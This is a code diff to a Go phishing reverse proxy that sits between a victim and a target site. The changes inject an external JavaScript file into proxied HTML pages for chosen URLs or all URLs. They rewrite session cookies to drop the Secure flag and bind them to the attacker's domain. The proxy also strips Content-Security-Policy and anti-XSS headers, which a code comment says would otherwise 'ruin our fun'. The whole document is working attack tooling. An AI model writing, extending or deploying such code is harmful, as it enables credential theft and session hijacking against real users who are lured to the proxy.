@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/http/httputil"
 	"net/url"
+	"strconv"
 	"strings"
 
 	"github.com/valyala/bytebufferpool"
@@ -27,10 +28,22 @@ func (b *bufferPool) Put(payload []byte) {
 	b.Set(payload)
 }
 
+//多字符串匹配
+func strContainList(rawStr string, checkStrList []string) bool {
+	rawStr = strings.ToLower(rawStr)
+	for _, checkStr := range checkStrList {
+		if strings.Contains(rawStr, strings.ToLower(checkStr)) {
+			return true
+		}
+	}
+	return false
+}
+
 // phishingProxy proxies requests between the victim and the target, queuing requests for further processing.
 // It is meant to be embedded in a httputil.ReverseProxy, with the Director and ModifyResponse functions.
 type phishingProxy struct {
 	TargetURL     *url.URL
+	Reverse       *ReverseConfig
 	JavascriptURL string
 	Logger        *log.Logger
 }
@@ -75,17 +88,29 @@ func (p *phishingProxy) ModifyResponse(response *http.Response) error {
 	if err != nil {
 		return err
 	}
+	err = p.modifyCookieHeader(response)
 
-	if p.JavascriptURL != "" {
-		err = p.injectJavascript(response)
-		if err != nil {
-			return err
+	if err != nil {
+		return err
+	}
+	if strContainList(response.Request.RequestURI, p.Reverse.InjectURLs) || p.Reverse.InjectURLs[0] == "*" {
+		if p.JavascriptURL != "" {
+			err = p.injectJavascript(response)
+			if err != nil {
+				return err
+			}
 		}
 	}
 
 	// Stop CSPs and anti-XSS headers from ruining our fun
 	response.Header.Del("Content-Security-Policy")
 	response.Header.Del("X-XSS-Protection")
+
+	body, err := ioutil.ReadAll(response.Body)
+
+	response.Body = ioutil.NopCloser(bytes.NewReader(body))
+	response.ContentLength = int64(len(body))
+	response.Header.Set("Content-Length", strconv.Itoa(len(body)))
 
 	return nil
 }
@@ -99,29 +124,60 @@ func (p *phishingProxy) modifyLocationHeader(response *http.Response) error {
 		return err
 	}
 
+	log.Printf("Location Host :%s, targetURL: %s \n", location.Host, p.TargetURL.Host)
+	if p.TargetURL.Host == location.Host {
+		location.Scheme = ""
+		location.Host = ""
+	}
 	// Turn it into a relative URL
-	location.Scheme = ""
-	location.Host = ""
+
 	response.Header.Set("Location", location.String())
 	return nil
 }
 
+func (p *phishingProxy) modifyCookieHeader(response *http.Response) error {
+	var mcook []string
+	rcookies := response.Cookies()
+	for _, value := range rcookies {
+		value.Secure = false
+		mcook = append(mcook, value.String())
+		value.Domain = p.Reverse.Address
+		if p.Reverse.CookieDomain != "" {
+			value.Domain = p.Reverse.CookieDomain
+			log.Printf("Use reverse domain %s\n", p.Reverse.CookieDomain)
+		}
+		mcook = append(mcook, value.String())
+	}
+	response.Header.Del("Set-Cookie")
+	for _, mc := range mcook {
+		response.Header.Add("Set-Cookie", mc)
+	}
+	cooValue := response.Header.Get("Set-Cookie")
+	if cooValue != "" {
+		fmt.Println(cooValue)
+	}
+
+	return nil
+}
+
 func (p *phishingProxy) injectJavascript(response *http.Response) error {
-	if !strings.Contains(response.Header.Get("Content-Type"), "text/html"){
+	log.Printf("url :%s\n", response.Request.RequestURI)
+	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
 		return nil
 	}
 
 	html, _ := ioutil.ReadAll(response.Body)
 	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
-	if !bytes.Contains(html[:100], []byte("<html")){
+	if bytes.Index(html, []byte("html")) == -1 {
 		return nil
 	}
 
 	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", p.JavascriptURL)
+	log.Printf("url :%s, payload: %s\n", response.Request.RequestURI, payload)
 	html = append(html, payload...)
 
 	response.Body = ioutil.NopCloser(bytes.NewBuffer(html))
-	response.Header.Set("Content-Length",fmt.Sprint(len(html)))
+	response.Header.Set("Content-Length", fmt.Sprint(len(html)))
 	return nil
 }
 
@@ -194,6 +250,7 @@ func (p *ProxyServer) HandleRequests(w http.ResponseWriter, r *http.Request) {
 func New(config *Config) *ProxyServer {
 	phishingProxy := &phishingProxy{
 		TargetURL:     config.TargetURL,
+		Reverse:       config.Reverse,
 		JavascriptURL: config.JavascriptURL,
 		Logger:        config.Logger,
 	}
